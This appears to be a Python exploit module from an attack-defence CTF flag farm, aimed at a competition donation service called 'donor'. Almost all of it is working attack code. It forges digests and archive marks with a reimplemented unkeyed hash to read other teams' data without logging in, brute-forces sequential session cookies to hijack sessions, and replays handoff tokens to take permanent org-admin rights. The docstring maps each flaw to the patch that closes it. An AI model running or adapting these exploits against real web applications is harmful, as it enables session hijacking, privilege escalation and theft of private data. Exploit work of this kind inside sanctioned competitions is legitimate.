#!/usr/bin/env python3
"""donor (4739/http) — farm module.

Audit: /home/kali/adctf/cubectf/audit/donor.md
Source: /home/kali/adctf/cubectf/services/services/donor  (NOTE: that tree is now
OUR patched copy; the pristine source other teams still run is in
/home/kali/adctf/cubectf/services.tgz under services/donor/.)

What this returns
-----------------
Donation `note` strings and `org.vault` values — the two places the checker's
flag lands (audit "Service brief"). The farm applies the flag regex itself, so
every non-empty note/vault we recover is handed back raw.

Root cause shared by three of the four chains
---------------------------------------------
`fold()` (`src/util.js:7`) is an UNKEYED FNV-1a-with-rotate hash and there is no
server secret anywhere in the pristine codebase, yet it is used as a MAC for the
ledger digest, the archive mark, the handoff proof, the donation quote and the
routing ticket. `_fold()` below is a byte-for-byte Python reimplementation
(verified against `node src/util.js` over 431 vectors incl. empty string,
latin-1, BMP and astral code points, and the 48-char `clean()` truncation
boundary: 0 mismatches). `_clean()` and `_lane_for()` mirror `util.js:59` and
`util.js:28` for the same reason — the server folds the *cleaned* value.

Chains implemented (cheapest first)
-----------------------------------
v_ledger_window  — audit chain A. `ledgerWindow` (`src/handlers/ledger.js:19`)
    never calls `sessionUser`; its only gate is `fold(org:lane) === digest`.
    One unauthenticated GET per victim org returns every donation note in that
    org. No account, no cookie. Bulk: one request = every note the org holds.
    PATCH THAT KILLS IT: audit P-A — require a session and scope the rows to
    `isAdmin(org,user) || d.donor === user`, keeping the digest gate and the
    403 'window closed' body unchanged. (A team that instead keys `fold()`
    also kills it — that is what our own P-A+util.js patch does.)

v_org_archive    — audit chain B. `orgArchive` (`src/handlers/org.js:6`)
    destructures `req` but never calls `sessionUser`; gate is
    `fold(slug:owner) === mark`, and `owner` is published by the
    unauthenticated `GET /api/orgs/:slug` (`campaigns.js:35`). Independent of A
    on purpose: teams patch one reader of `note` and forget the other.
    PATCH THAT KILLS IT: audit P-B — same shape as P-A on org.js, or dropping
    `owner` from `GET /api/orgs/:slug` (P-G), or keying `fold()`.

v_session_bruteforce — audit chain C. `newId` (`src/state.js:11`) is a single
    global hex counter and `login` uses it verbatim as the cookie
    (`auth.js:46`), so sids are `s00000001, s00000002, ...`. We register once to
    read the counter's high-water mark off our own `Set-Cookie`, then walk a
    BOUNDED window of lower sids, confirming each with `GET /api/me/donations`
    and escalating confirmed sessions to `GET /api/orgs/:slug/donations` for
    `vault`. Sessions are never expired or evicted, so confirmed sids are
    cached and reused for free on later sweeps.
    PATCH THAT KILLS IT: audit P-C — `randomBytes` for the sid only, keeping
    `state.sequence` advancing so campaign/donation numbering is unchanged.
    (Our own box is still UNPATCHED here — see "Defence note" below.)

v_handoff        — audit chain D. `acceptHandoff` (`src/handlers/org.js:32`)
    checks only that the stamp is inside the 4-minute window and that
    `state.handoffs.has(pieces[2])`; the proof is never bound to `params.slug`
    nor to an admin of it. We mint a handoff on an org we just created and
    redeem it on each victim org, which `org.admins.push`es us permanently
    (`org.js:52`) and hands us `vault` + every note. Deterministic, no guessing;
    the audit rates it more reliable than C, it is ordered after C only because
    it costs more requests.
    PATCH THAT KILLS IT: audit P-D — store `{user, slug}` in `state.handoffs`
    and require `record.slug === params.slug && isAdmin(params.slug, record.user)`
    (optionally single-use), keeping the token format and `{"accepted":true}`.

DELIBERATELY NOT IMPLEMENTED — audit chain E (forged routing ticket)
-------------------------------------------------------------------
`routingSettle` (`src/handlers/routing.js:23`) lets us forge a ticket offline
and rewrite `donation.org` to our own org. It works, but it *moves* the victim's
donation out of their org and flips `settled`, which will almost certainly drive
their checker to CORRUPT. That is a rules problem for us and it destroys the SLA
we need the victim to keep paying us for. It is also redundant: A/B/D already
read the same note non-destructively. The working PoC lives in audit section
"E. Forged routing ticket steals a donation into our own org" of
/home/kali/adctf/cubectf/audit/donor.md (4 shell commands, no code needed here).
If A, B, C and D are ever all patched everywhere, lift it from there — do not
re-enable it casually. Audit "Open leads" lists a second destructive primitive
(unkeyed quote -> inject a donation row into a victim campaign); omitted for the
same reason, and because injected rows pollute this module's own A/B output.

Defence note (not this module's job, but found while writing it)
---------------------------------------------------------------
/home/kali/adctf/cubectf/patches/02-donor.patch keys every MAC and adds the
authorization checks, so A, B, D and E are closed on our box — but
`src/state.js` / `src/handlers/auth.js` are untouched, so chain C (sequential
`s0000000N` sessions) is still LIVE against us. P-C is unapplied.

Cost shape
----------
BULK FETCH, not per-flag rental. Every reader here returns the org's *whole*
donation list, and `state.donations` is never pruned, so one request recovers
every note planted in that org for the container's lifetime. Continuous
sweeping pays (new flags appear in the same response); there is no per-flag-id
rental and no need to race the publish tick.
"""

from __future__ import annotations

import json
import os
import re
import sys
import time
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from _common import (  # noqa: E402
    DEFAULT_TIMEOUT,
    dedup,
    http,
    http_json,
    main,
    rand_name,
    rand_pass,
    run_vectors,
    safe,
    urlencode,
)

NAME = "donor"
PORT = 4739

# --------------------------------------------------------------------- caps
# All loops in this module are bounded by these. Nothing here fans out, nothing
# runs concurrently, and one dead target costs at most a couple of timeouts.

#: Campaign ids are `c%08x` over a counter SHARED with donations and sessions
#: (`state.js:11`), so the campaign ids are sparse inside the sequence space and
#: a run of 404s is normal — we cannot early-stop on misses. 256 covers the
#: checker's orgs comfortably (they are created in the first few rounds, at low
#: sequence numbers) while staying a cheap one-off: ~256 tiny GETs on the FIRST
#: sweep per host only.
CAMPAIGN_WALK_CAP = 256

#: Every later sweep only extends the walk by this many ids past the cursor, so
#: a continuously running farm pays ~64 GETs/sweep to pick up orgs and campaigns
#: created mid-game instead of re-walking 256.
CAMPAIGN_WALK_STEP = 64

#: Session ids probed per sweep (chain C). Deliberately small: a scored service
#: must not see a flood from us. 48 keeps us in the same order of magnitude as
#: the checker's own traffic, and `_CURSOR` makes it resumable, so a ~400-id
#: keyspace is covered over ~8 sweeps instead of in one burst. Sessions are
#: immortal (`state.sessions` is never pruned), so ids we have already confirmed
#: are cached and never re-brute-forced.
SESSION_WALK_CAP = 48

#: `GET /api/orgs/:slug/donations` probes per sweep when escalating confirmed
#: sessions to org-admin. Bounds the (live sids x orgs) product; (sid, slug)
#: pairs that answered are cached, pairs that 403'd are remembered and skipped.
ADMIN_PROBE_CAP = 32

#: Victim orgs worked per sweep, per vector. Caps the per-org request loops.
ORG_CAP = 12

#: Minimum seconds between extension walks for one host. Four vectors share one
#: discovery cache, so without this the cheap `CAMPAIGN_WALK_STEP` walk would be
#: paid four times per sweep instead of once.
WALK_MIN_INTERVAL = 20.0

#: Per-request ceiling for the enumeration loops, so a slow-but-alive target
#: cannot turn a bounded walk into a multi-minute stall.
PROBE_TIMEOUT = 3.0

#: Whole-vector wall-clock ceiling, derived from the caller's timeout.
VECTOR_BUDGET = 12.0

FORM_CT = {"Content-Type": "application/x-www-form-urlencoded"}


# ------------------------------------------------------- service primitives

_MASK64 = (1 << 64) - 1
_FNV_OFFSET = 0xCBF29CE484222325
_FNV_PRIME = 0x100000001B3
_CLEAN_RE = re.compile(r"[a-zA-Z0-9_-]")


def _rotl64(value: int, bits: int) -> int:
    """`src/util.js:16` rotl64."""
    return ((value << bits) | (value >> (64 - bits))) & _MASK64


def _fold(value) -> str:
    """`src/util.js:7` fold() — unkeyed FNV-1a with a rotate-xor finalizer.

    Verified byte-for-byte against the Node implementation; see module docstring.
    """
    h = _FNV_OFFSET
    for byte in str(value).encode("utf-8"):
        h ^= byte
        h = (h * _FNV_PRIME) & _MASK64
        h ^= _rotl64(h, 13)
    return format(h, "016x")


def _clean(value) -> str:
    """`src/util.js:59` clean() — filter, truncate to 48, THEN lowercase.

    The server folds the cleaned value, so we must clean before folding or the
    digest will not match for any slug/lane with odd characters.
    """
    return "".join(c for c in str(value) if _CLEAN_RE.match(c))[:48].lower()


def _lane_for(slug) -> str:
    """`src/util.js:28` laneFor() — the default lane of an org."""
    return "ln" + _fold(slug)[:8]


def _sid(index: int) -> str:
    """`src/state.js:11` newId('s') — the session cookie format."""
    return "s%08x" % index


# ------------------------------------------------------------- http helpers


def _get(host, port, path, timeout, sid=None):
    headers = {"Cookie": "sid=%s" % sid} if sid else None
    return http_json(host, port, path, "GET", headers=headers, timeout=timeout)


def _post_form(host, port, path, fields, timeout, sid=None):
    """POST an x-www-form-urlencoded body — the service hand-parses forms only.

    Returns (status, parsed_json_or_None, headers).
    """
    headers = dict(FORM_CT)
    if sid:
        headers["Cookie"] = "sid=%s" % sid
    status, resp_headers, raw = http(
        host, port, path, "POST", urlencode(**fields), headers, timeout
    )
    try:
        parsed = json.loads(raw)
    except Exception:  # noqa: BLE001 - any non-JSON body is just "no data"
        parsed = None
    return status, parsed, resp_headers


def _set_cookie_sid(headers) -> str | None:
    for key, value in (headers or {}).items():
        if key.lower() == "set-cookie" and "sid=" in value:
            return value.split("sid=", 1)[1].split(";", 1)[0].strip()
    return None


def _quote(segment: str) -> str:
    return urllib.parse.quote(str(segment), safe="")


# -------------------------------------------------------------- target state
# Per-host, in-process, reused across sweeps. Holds only *discovered* facts
# about the victim (slugs, owners, lanes, confirmed victim sids) and the two
# resumable cursors. Our own credentials are NEVER cached: every vector that
# needs an account mints fresh ones per call.

_TARGETS: dict[str, dict] = {}


def _target(host: str) -> dict:
    return _TARGETS.setdefault(
        host,
        {
            "fingerprinted": False,
            "orgs": {},  # slug -> owner (or None until fetched)
            "lanes": set(),  # every campaign lane seen
            "campaign_next": 1,  # resumable campaign-walk cursor
            "primed": False,  # has the initial CAMPAIGN_WALK_CAP walk run?
            "session_next": 1,  # resumable session-brute-force cursor
            "sequence_high": 0,  # last seen value of the victim's global counter
            "walked_at": 0.0,  # monotonic time of the last extension walk
            "live_sids": set(),  # confirmed-live victim sessions (immortal)
            "sid_donor": {},  # sid -> the donor identity behind it, if it leaked
            "admin_pairs": set(),  # (sid, slug) known to reach org-admin
            "dead_pairs": set(),  # (sid, slug) known NOT to reach org-admin
        },
    )


def _fingerprint(host, port, timeout) -> bool:
    """Cheap "is this donor at all" gate, so dead/foreign targets cost ~1 req."""
    state = _target(host)
    if state["fingerprinted"]:
        return True
    probe = min(timeout, PROBE_TIMEOUT)
    status, data = _get(host, port, "/health", probe)
    if status == 0:
        return False  # refused or filtered: do not probe again
    if status == 200 and isinstance(data, dict) and data.get("ok") is True:
        state["fingerprinted"] = True
        return True
    # /health could be patched away; donor's 404 body is distinctive enough.
    status, data = _get(host, port, "/api/campaigns/c00000001", probe)
    if status in (200, 404) and isinstance(data, dict):
        if "org" in data or data.get("error") == "missing campaign":
            state["fingerprinted"] = True
            return True
    return False


# ------------------------------------------------------------- enumeration
# "Enumerate server-side, never guess slugs": `GET /api/campaigns/:id` needs no
# auth and publishes the org slug AND the lane (audit "Target discovery").


def _walk_campaigns(host, port, timeout, deadline) -> dict:
    state = _target(host)
    if state["primed"]:
        now = time.monotonic()
        if now - state["walked_at"] < WALK_MIN_INTERVAL:
            return state  # another vector already extended the walk this sweep
        low = state["campaign_next"]
        high = low + CAMPAIGN_WALK_STEP - 1
        # Campaign ids can never exceed the shared counter (`state.js:11`), so
        # once a session-bearing vector has told us where the counter is, stop
        # walking into ids that cannot exist yet.
        mark = state["sequence_high"]
        if mark:
            if low > mark:
                state["walked_at"] = now
                return state
            high = min(high, mark)
        state["walked_at"] = now
    else:
        low, high = 1, CAMPAIGN_WALK_CAP
    probe = min(timeout, PROBE_TIMEOUT)
    index = low
    clean_walk = True
    while index <= high:
        if time.monotonic() > deadline:
            clean_walk = False
            break
        status, data = _get(host, port, "/api/campaigns/%s" % ("c%08x" % index), probe)
        if status == 0:
            clean_walk = False  # transport died: stop, and re-prime next sweep
            break
        if status == 200 and isinstance(data, dict):
            slug = _clean(data.get("org") or "")
            lane = _clean(data.get("lane") or "")
            if slug:
                state["orgs"].setdefault(slug, None)
            if lane:
                state["lanes"].add(lane)
        index += 1
    state["campaign_next"] = max(state["campaign_next"], index)
    if clean_walk:
        state["primed"] = True
        state["walked_at"] = time.monotonic()
    return state


def _fill_owners(host, port, timeout, deadline) -> dict:
    """`GET /api/orgs/:slug` is unauthenticated and publishes `owner` (chain B)."""
    state = _target(host)
    probe = min(timeout, PROBE_TIMEOUT)
    for slug in list(state["orgs"])[:ORG_CAP]:
        if state["orgs"][slug] is not None:
            continue
        if time.monotonic() > deadline:
            break
        status, data = _get(host, port, "/api/orgs/%s" % _quote(slug), probe)
        if status == 0:
            break
        if status == 200 and isinstance(data, dict):
            owner = data.get("owner")
            if isinstance(owner, str) and owner:
                state["orgs"][slug] = owner
            for campaign in data.get("campaigns") or []:
                if isinstance(campaign, dict):
                    lane = _clean(campaign.get("lane") or "")
                    if lane:
                        state["lanes"].add(lane)
    return state


def _victims(host, port, timeout, deadline) -> list[str]:
    """Bounded, server-side-enumerated victim org slugs."""
    state = _walk_campaigns(host, port, timeout, deadline)
    return sorted(state["orgs"])[:ORG_CAP]


# ----------------------------------------------------------------- harvest


def _rows(payload, key) -> list[dict]:
    if not isinstance(payload, dict):
        return []
    rows = payload.get(key)
    return [r for r in rows if isinstance(r, dict)] if isinstance(rows, list) else []


def _notes(payload, key) -> list[str]:
    out = []
    for row in _rows(payload, key):
        note = row.get("note")
        if isinstance(note, str) and note.strip():
            out.append(note)
    return out


def _vault(payload) -> list[str]:
    if isinstance(payload, dict):
        vault = payload.get("vault")
        if isinstance(vault, str) and vault.strip():
            return [vault]
    return []


def _budget(timeout: float) -> float:
    return time.monotonic() + max(VECTOR_BUDGET, timeout * 4)


# ------------------------------------------------------------------ vectors


@safe
def v_ledger_window(host, port, timeout=DEFAULT_TIMEOUT):
    """Chain A: unauthenticated GET /api/ledger/window with a self-folded digest.

    `ledger.js:19` never calls sessionUser; the gate is `fold(org:lane)===digest`
    and `fold` is unkeyed. One GET per org returns every note in it.
    """
    if not _fingerprint(host, port, timeout):
        return []
    deadline = _budget(timeout)
    slugs = _victims(host, port, timeout, deadline)
    probe = min(timeout, PROBE_TIMEOUT)
    found: list[str] = []
    covered: set[str] = set()

    # Primary form: org-scoped window, lane empty -> fold("<slug>:").
    for slug in slugs:
        if time.monotonic() > deadline:
            break
        query = urlencode(org=slug, lane="", digest=_fold("%s:" % slug))
        status, data = _get(host, port, "/api/ledger/window?%s" % query, probe)
        if status == 0:
            break
        notes = _notes(data, "entries")
        if status == 200:
            covered.add(slug)
        found.extend(notes)

    # Backup form: the predicate is `campaign.org === org || campaign.lane === lane`
    # (ledger.js:29), so a lane-only window reads rows whose org we never
    # resolved. Only paid for when the org form produced nothing.
    if not found:
        state = _target(host)
        for lane in sorted(state["lanes"])[:ORG_CAP]:
            if time.monotonic() > deadline:
                break
            query = urlencode(org="", lane=lane, digest=_fold(":%s" % lane))
            status, data = _get(host, port, "/api/ledger/window?%s" % query, probe)
            if status == 0:
                break
            found.extend(_notes(data, "entries"))
    return dedup(found)


@safe
def v_org_archive(host, port, timeout=DEFAULT_TIMEOUT):
    """Chain B: unauthenticated GET /api/orgs/:slug/archive?mark=fold(slug:owner).

    `org.js:6` never calls sessionUser, and `owner` is published by the
    unauthenticated `GET /api/orgs/:slug` (`campaigns.js:35`). Independent
    backup for chain A — teams patch one note reader and forget the other.
    """
    if not _fingerprint(host, port, timeout):
        return []
    deadline = _budget(timeout)
    _victims(host, port, timeout, deadline)
    state = _fill_owners(host, port, timeout, deadline)
    probe = min(timeout, PROBE_TIMEOUT)
    found: list[str] = []
    for slug in sorted(state["orgs"])[:ORG_CAP]:
        owner = state["orgs"][slug]
        if not owner or time.monotonic() > deadline:
            continue
        query = urlencode(mark=_fold("%s:%s" % (slug, owner)))
        status, data = _get(
            host, port, "/api/orgs/%s/archive?%s" % (_quote(slug), query), probe
        )
        if status == 0:
            break
        found.extend(_notes(data, "archive"))
    return dedup(found)


@safe
def v_session_bruteforce(host, port, timeout=DEFAULT_TIMEOUT):
    """Chain C: sequential `s0000000N` cookies -> donor notes and org `vault`.

    `newId` (`state.js:11`) is one global hex counter and `login` uses it
    verbatim as the sid (`auth.js:46`). Register fresh (never reuse creds) to
    read the counter's high-water mark off our own Set-Cookie, then walk a
    bounded, resumable window of lower sids. Confirmed sids are cached because
    `state.sessions` is never pruned.
    """
    if not _fingerprint(host, port, timeout):
        return []
    deadline = _budget(timeout)
    state = _target(host)
    slugs = _victims(host, port, timeout, deadline)
    probe = min(timeout, PROBE_TIMEOUT)

    # Fresh throwaway credentials every call.
    username, password = rand_name("u"), rand_pass(14)
    status, _, _ = _post_form(
        host, port, "/api/register_user",
        {"username": username, "password": password}, min(timeout, PROBE_TIMEOUT),
    )
    if status != 200:
        return []
    status, _, headers = _post_form(
        host, port, "/api/login",
        {"username": username, "password": password}, min(timeout, PROBE_TIMEOUT),
    )
    own_sid = _set_cookie_sid(headers)
    if status != 200 or not own_sid or not re.fullmatch(r"s[0-9a-f]{8}", own_sid):
        return []  # sid is not sequential any more: chain C is patched here
    high = int(own_sid[1:], 16)
    state["sequence_high"] = max(state["sequence_high"], high)

    # Bounded, resumable window. Wrap to 1 once the cursor passes the counter,
    # because new sessions keep appearing at the top and old ones never die.
    cursor = state["session_next"]
    if cursor >= high:
        cursor = 1
    end = min(cursor + SESSION_WALK_CAP, high)
    state["session_next"] = 1 if end >= high else end

    found: list[str] = []
    for index in range(cursor, end):
        if time.monotonic() > deadline:
            state["session_next"] = index
            break
        candidate = _sid(index)
        if candidate == own_sid or candidate in state["live_sids"]:
            continue
        status, data = _get(host, port, "/api/me/donations", probe, sid=candidate)
        if status == 0:
            break
        if status == 200:
            state["live_sids"].add(candidate)
            rows = _rows(data, "donations")
            found.extend(_notes(data, "donations"))
            # `/api/me/donations` leaks the donor behind the cookie. Several
            # sids can belong to one identity (login is never rate-limited and
            # old sessions never die), and identity is what decides admin, so
            # we only spend an admin probe on the first sid of each identity.
            donors = {r.get("donor") for r in rows if isinstance(r.get("donor"), str)}
            if len(donors) == 1:
                state["sid_donor"][candidate] = donors.pop()

    # Escalate: a confirmed session that is an org admin also yields `vault`.
    # SID-MAJOR and ascending: the org admin registers and logs in before its
    # donors, so the lowest sids are the valuable ones, and a slug-major loop
    # would spend the whole probe budget on the first org and silently miss the
    # second org's vault. Cached hits are replayed first (sessions are
    # immortal); cached misses are never re-probed.
    probes = 0
    best: dict[str, str] = {}
    for sid, slug in sorted(state["admin_pairs"]):
        best.setdefault(slug, sid)  # one admin sid per org is enough: the
        # response is the same whichever admin asks, so replaying every known
        # pair would grow without bound and starve new discovery of its budget.
    for slug in sorted(best)[:ORG_CAP]:
        if time.monotonic() > deadline or probes >= ADMIN_PROBE_CAP:
            break
        status, data = _get(
            host, port, "/api/orgs/%s/donations" % _quote(slug), probe,
            sid=best[slug],
        )
        probes += 1
        if status == 200:
            found.extend(_vault(data))
            found.extend(_notes(data, "donations"))
        else:
            state["admin_pairs"].discard((best[slug], slug))  # service restarted

    seen_donors: set[str] = set()
    for sid in sorted(state["live_sids"]):
        if time.monotonic() > deadline or probes >= ADMIN_PROBE_CAP:
            break
        donor = state["sid_donor"].get(sid)
        if donor:
            if donor in seen_donors:
                continue
            seen_donors.add(donor)
        for slug in slugs:
            pair = (sid, slug)
            if pair in state["admin_pairs"] or pair in state["dead_pairs"]:
                continue
            if time.monotonic() > deadline or probes >= ADMIN_PROBE_CAP:
                break
            status, data = _get(
                host, port, "/api/orgs/%s/donations" % _quote(slug), probe, sid=sid
            )
            probes += 1
            if status == 0:
                return dedup(found)
            if status == 200:
                state["admin_pairs"].add(pair)
                found.extend(_vault(data))
                found.extend(_notes(data, "donations"))
            else:
                state["dead_pairs"].add(pair)
    return dedup(found)


@safe
def v_handoff(host, port, timeout=DEFAULT_TIMEOUT):
    """Chain D: replay our own handoff proof on a victim org -> permanent admin.

    `acceptHandoff` (`org.js:32`) only checks the 4-minute stamp and
    `state.handoffs.has(proof)`; the proof is bound to neither `params.slug` nor
    an admin of it. Mint on an org we create, redeem on each victim, then read
    `GET /api/orgs/:slug/donations` for `vault` + every note.
    """
    if not _fingerprint(host, port, timeout):
        return []
    deadline = _budget(timeout)
    slugs = _victims(host, port, timeout, deadline)
    if not slugs:
        return []
    probe = min(timeout, PROBE_TIMEOUT)

    # Fresh throwaway org + credentials every call.
    username, password = rand_name("u"), rand_pass(14)
    our_slug = rand_name("o", 9)
    status, _, _ = _post_form(
        host, port, "/api/register_org",
        {
            "username": username,
            "password": password,
            "org_slug": our_slug,
            "org_name": our_slug,
        },
        probe,
    )
    if status != 200:
        return []
    status, _, headers = _post_form(
        host, port, "/api/login",
        {"username": username, "password": password}, probe,
    )
    sid = _set_cookie_sid(headers)
    if status != 200 or not sid:
        return []
    # Our own cookie reads the victim's global counter for free; it bounds both
    # the campaign walk and chain C's session window on the next sweep.
    if re.fullmatch(r"s[0-9a-f]{8}", sid):
        state = _target(host)
        state["sequence_high"] = max(state["sequence_high"], int(sid[1:], 16))

    def mint():
        status_, data_ = _get(
            host, port, "/api/orgs/%s/handoff" % _quote(our_slug), probe, sid=sid
        )
        if status_ != 200 or not isinstance(data_, dict):
            return None
        token_ = data_.get("handoff")
        return token_ if isinstance(token_, str) and token_.count(".") == 2 else None

    token = mint()
    if not token:
        return []

    found: list[str] = []
    for slug in slugs:
        if time.monotonic() > deadline:
            break
        status, data, _ = _post_form(
            host, port, "/api/orgs/%s/handoff/accept" % _quote(slug),
            {"handoff": token}, probe, sid=sid,
        )
        if status == 0:
            break
        if status != 200:
            # Only re-mint for an expired stamp; a bound/consumed proof means
            # the target is patched and retrying would just be noise.
            if isinstance(data, dict) and data.get("error") == "handoff expired":
                token = mint()
                if not token:
                    break
                status, data, _ = _post_form(
                    host, port, "/api/orgs/%s/handoff/accept" % _quote(slug),
                    {"handoff": token}, probe, sid=sid,
                )
            if status != 200:
                continue
        status, data = _get(
            host, port, "/api/orgs/%s/donations" % _quote(slug), probe, sid=sid
        )
        if status == 200:
            found.extend(_vault(data))
            found.extend(_notes(data, "donations"))
    return dedup(found)


VECTORS = [v_ledger_window, v_org_archive, v_session_bruteforce, v_handoff]


def run(host, port=PORT, timeout=8.0) -> list[str]:
    """Return every recovered secret string. MUST NOT raise."""
    return run_vectors(VECTORS, host, port, timeout)


if __name__ == "__main__":
    raise SystemExit(main(run, PORT))
